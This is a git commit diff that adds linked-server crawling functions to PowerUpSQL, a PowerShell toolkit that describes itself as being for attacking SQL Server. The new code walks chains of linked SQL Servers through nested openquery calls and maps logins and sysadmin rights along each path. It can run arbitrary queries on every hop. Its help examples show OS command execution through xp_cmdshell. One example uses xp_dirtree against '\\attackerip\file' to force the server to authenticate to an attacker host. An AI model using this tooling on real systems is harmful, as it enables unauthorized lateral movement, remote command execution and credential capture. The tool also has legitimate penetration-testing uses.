c2c90357ba9f71328b093fe195fc359b42a6e220
Scott Sutherland <nullbind@users.noreply.github.com>
2017-02-16 13:08:30 -0600

    Add SQL Server Link Functions
    Added Antti's functions:
    Get-SQLServerLinkCrawl
    Get-SQLServerLinkData
    Get-SQLServerLinkQuery

--- PowerUpSQL.ps1
+++ PowerUpSQL.ps1
@@ -3,7 +3,7 @@
         File: PowerUpSQL.ps1
         Author: Scott Sutherland (@_nullbind), NetSPI - 2016
         Contributors: Antti Rantasaari and Eric Gruber
-        Version: 1.0.0.58
+        Version: 1.0.0.59
         Description: PowerUpSQL is a PowerShell toolkit for attacking SQL Server.
         License: BSD 3-Clause
         Required Dependencies: PowerShell v.2
@@ -9354,6 +9354,234 @@ Function  Get-SQLServerLoginDefaultPw
     }
 }
 
+Function Get-SQLServerLinkCrawl{
+    <#
+    .SYNOPSIS
+    Get-SQLServerLinkCrawl attempts to enumerate and follow MSSQL database links.
+    .DESCRIPTION
+    Get-SQLServerLinkCrawl attempts to enumerate and follow MSSQL database links. The function enumerates database names, versions, and links,
+    and then enumerates the MSSQL user and the privileges that the link path has.
+    .EXAMPLE
+    Get-SQLServerLinkCrawl -Instance "servername\instancename"
+    .PARAMETER Username
+    SQL Server or domain account to authenticate with.
+    .PARAMETER Password
+    SQL Server or domain account password to authenticate with.
+    .PARAMETER Credential
+    Windows credentials.
+    .PARAMETER Instance
+    SQL Server instance to connection to.
+    .PARAMETER DAC
+    Dedicated Administrator Connection (DAC).
+    .PARAMETER TimeOut
+    Connection timeout.
+    .PARAMETER Query
+    Custom SQL query to run on each server.
+    .PARAMETER Export
+    Convert collected data to exportable format.
+    .Example
+    Crawl linked servers and return a list of databases for each one in a readable format.
+    Get-SQLServerLinkCrawl -instance "10.2.9.101\SQLSERVER2008" -username 'guest' -password 'guest' | where Instance -ne "Broken Link" |
+    foreach-object { Get-SQLQuery -instance "10.2.9.101\SQLSERVER2008" -username 'guest' -password 'guest' -Query (get-SQLServerLinkQuery -Path $_.Path -Sql 'select system_user')}
+    .Example
+    Crawl linked servers and return a list of databases for each one as datatable objects.
+    Get-SQLServerLinkCrawl -instance "SQLSERVER1\Instance1" -Query "select name from master..sysdatabases"
+    .Example
+    Crawl linked servers and return a list of databases for each one. and hide broken links.
+    Get-SQLServerLinkCrawl -instance "SQLSERVER1\Instance1" -Query "select name from master..sysdatabases" | where name -ne "Broken Link" | select name,version,path,links,user,sysadmin,customquery | format-table
+    .Example
+    Crawl linked servers, execute an OS command using xp_cmdshell, and return the results.
+    Get-SQLServerLinkCrawl -instance "SQLSERVER1\Instance1" -Query "exec master..xp_cmdshell 'whoami'" | format-table
+    .Example
+    Crawl linked servers, execute xp_dirtree, and return results.  This can also be used to force the SQL Server to authenticate to an attacker using a UNC path.
+    Get-SQLServerLinkCrawl -instance "SQLSERVER1\Instance1" -Query "exec xp_dirtree 'c:\temp'" -Export | format-table
+    Get-SQLServerLinkCrawl -instance "SQLSERVER1\Instance1" -Query "exec xp_dirtree '\\attackerip\file'" -Export | format-table
+    .Example
+     Crawl linked servers and return a list of databases for each one, then export to a to text objects for reporting.
+    Get-SQLServerLinkCrawl -instance "SQLSERVER1\Instance1" -Query "select name from master..sysdatabases" -Export | where name -ne "broken link" | sort name |  Format-Table
+    #>
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory=$false,
+        HelpMessage="SQL Server or domain account to authenticate with.")]
+        [string]$Username,
+
+        [Parameter(Mandatory=$false,
+        HelpMessage="SQL Server or domain account password to authenticate with.")]
+        [string]$Password,
+
+        [Parameter(Mandatory=$false,
+        HelpMessage="Windows credentials.")]
+        [System.Management.Automation.PSCredential]
+        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
+        
+        [Parameter(Mandatory=$false,
+        ValueFromPipelineByPropertyName=$true,
+        HelpMessage="SQL Server instance to connection to.")]
+        [string]$Instance,
+
+        [Parameter(Mandatory=$false,
+        HelpMessage="Dedicated Administrator Connection (DAC).")]
+        [Switch]$DAC,
+
+        [Parameter(Mandatory=$false,
+        HelpMessage="Connection timeout.")]
+        [int]$TimeOut = 2,
+
+        [Parameter(Mandatory=$false,
+        HelpMessage="Custom SQL query to run on each server.")]
+        [string]$Query,
+
+        [Parameter(Mandatory=$false,
+        HelpMessage="Convert collected data to exportable format.")]
+        [switch]$Export
+    )
+
+    Begin
+    {   
+        $List = @()
+
+        $Server = New-Object PSObject -Property @{ Instance=""; Version=""; Links=@(); Path=@(); User=""; Sysadmin=""; CustomQuery=""}
+
+        $List += $Server
+        $SqlInfoTable = New-Object System.Data.DataTable
+    }
+    
+    Process
+    {
+        $i=1
+        while($i){
+            $i--
+            foreach($Server in $List){
+                if($Server.Instance -eq "") {
+                    $List = (Get-SQLServerLinkData -list $List -server $Server -query $Query)
+                    $i++
+
+                    # Verbose output
+                    Write-Verbose "--------------------------------"
+                    Write-Verbose " Server: $($Server.Instance)"
+                    Write-Verbose "--------------------------------"
+                    Write-Verbose " - Link Path to server: $($Server.Path -join ' -> ')"                    
+                    Write-Verbose " - Link Login: $($Server.User)"                                   
+                    Write-Verbose " - Link IsSysAdmin: $($Server.Sysadmin)"
+                    Write-Verbose " - Link Count: $($Server.Links.Count)"                    
+                    Write-Verbose " - Links on this server: $($Server.Links -join ', ')"
+                }   
+            } 
+        }
+
+        if($Export){
+            $LinkList = New-Object System.Data.Datatable
+            [void]$LinkList.Columns.Add("Instance")
+            [void]$LinkList.Columns.Add("Version")
+            [void]$LinkList.Columns.Add("Path")
+            [void]$LinkList.Columns.Add("Links")
+            [void]$LinkList.Columns.Add("User")
+            [void]$LinkList.Columns.Add("Sysadmin")
+            [void]$LinkList.Columns.Add("CustomQuery")
+            
+            foreach($Server in $List){
+                [void]$LinkList.Rows.Add($Server.instance,$Server.version,$Server.path -join " -> ", $Server.links -join ",", $Server.user, $Server.Sysadmin, $Server.CustomQuery -join ",")
+            }
+
+            return $LinkList
+        } else {
+            return $List
+        }
+    }
+  
+    End
+    {
+    }
+}
+
+Function Get-SQLServerLinkData{
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory=$true,
+        HelpMessage="Return the server objects identified during the server link crawl.  Link crawling is done via theGet-SQLServerLinkCrawl function.")]
+        $List,
+        
+        [Parameter(Mandatory=$true,
+        HelpMessage="Server object to be tested")]
+        $Server,
+
+        [Parameter(Mandatory=$false,
+        HelpMessage="Custom SQL query to run")]
+        $Query
+    )
+
+    Begin
+    {
+        $SqlInfoQuery = "select @@servername as servername, @@version as version, system_user as linkuser, is_srvrolemember('sysadmin') as role"
+        $SqlLinksQuery = "select srvname from master..sysservers where dataaccess=1"
+    }
+
+    Process
+    {
+        $SqlInfoTable = Get-SqlQuery -instance $Instance -Query ((Get-SQLServerLinkQuery -path $Server.Path -sql $SqlInfoQuery)) -Timeout $Timeout -Username $UserName -Password $Password -Credential $Credential
+        if($SqlInfoTable.Servername -ne $null){
+            $Server.Instance = $SqlInfoTable.Servername
+            $Server.Version = [System.String]::Join("",(($SqlInfoTable.Version)[10..25]))
+            $Server.Sysadmin = $sqlInfoTable.role
+            $Server.User = $sqlInfoTable.linkuser
+            
+            if($List.Count -eq 1) { $Server.Path += ,$sqlInfoTable.servername }
+
+            $SqlInfoTable = Get-SqlQuery -instance $Instance -Query ((Get-SQLServerLinkQuery -path $Server.Path -sql $SqlLinksQuery)) -Timeout $Timeout -Username $UserName -Password $Password -Credential $Credential
+            $Server.Links = [array]$SqlInfoTable.srvname
+
+            if($Query -ne ""){
+                if($Query -like '*xp_cmdshell*'){
+                    $Query =  $Query + " WITH RESULT SETS ((output VARCHAR(8000)))"
+                }
+                if($Query -like '*xp_dirtree*'){
+                    $Query = $Query + "  WITH RESULT SETS ((output VARCHAR(8000), depth int))"
+                }
+                $SqlInfoTable = Get-SqlQuery -instance $Instance -Query ((Get-SQLServerLinkQuery -path $Server.Path -sql $Query)) -Timeout $Timeout -Username $UserName -Password $Password -Credential $Credential
+                if($Query -like '*WITH RESULT SETS*'){
+                    $Server.CustomQuery = $SqlInfoTable.output
+                } else {
+                    $Server.CustomQuery = $SqlInfoTable
+                }
+            }
+
+            if(($Server.Path | Sort-Object | Get-Unique).Count -eq ($Server.Path).Count){
+                foreach($Link in $Server.Links){
+                    $Linkpath = $Server.Path + $Link
+                    $List += ,(New-Object PSObject -Property @{ Instance=""; Version=""; Links=@(); Path=$Linkpath; User=""; Sysadmin=""; CustomQuery="" })
+                }
+            }
+        } else {
+            $Server.Instance = "Broken Link"
+        }
+        return $List
+    }
+}
+
+Function Get-SQLServerLinkQuery{
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory=$false,
+        HelpMessage="SQL link path to crawl. This is used by Get-SQLServerLinkCrawl.")]
+        $Path=@(),
+        
+        [Parameter(Mandatory=$false,
+        HelpMessage="SQL query to build the crawl path around")]
+        $Sql, 
+        
+        [Parameter(Mandatory=$false,
+        HelpMessage="Counter to determine how many single quotes needed")]
+        $Ticks=0
+
+    )
+    if ($Path.length -le 1){
+        return($Sql -replace "'", ("'"*[Math]::pow(2,$Ticks)))
+    } else {
+        return("select * from openquery(`""+$Path[1]+"`","+"'"*[Math]::pow(2,$Ticks)+
+        (Get-SQLServerLinkQuery -path $Path[1..($Path.Length-1)] -sql $Sql -ticks ($Ticks+1))+"'"*[Math]::pow(2,$Ticks)+")")
+    }
+}
 
 #endregion
 
